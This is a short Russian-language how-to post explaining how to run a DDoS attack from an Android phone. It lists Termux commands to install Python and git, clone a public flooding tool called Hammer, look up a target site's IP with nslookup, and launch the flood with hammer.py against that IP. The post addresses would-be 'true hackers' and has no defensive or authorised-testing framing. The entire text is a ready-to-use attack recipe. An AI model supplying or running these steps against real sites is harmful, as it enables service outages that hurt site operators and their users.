DDOS с помощью Android

Для того, чтобы стать тру хаckeром, надо лишь зайти в Termux, и последовательно ввести следующие команды:

apt update

apt upgrade

apt install python

apt install git

apt install dnsutils

git clone https://github.com/CruzTed/Hammer/

Для продолжения ддоса необходимо узнать name server атакуемого сайта.
Проблема эта решается 1 командой:
nslookup примерсайта.com

Записываем IP адрес сайта.

Далее вводим:
cd Hammer
python3 hammer.py -s ip адрес -t 135

Пример:
python3 hammer.py -s 123.45.67.89 -t 135

Готово!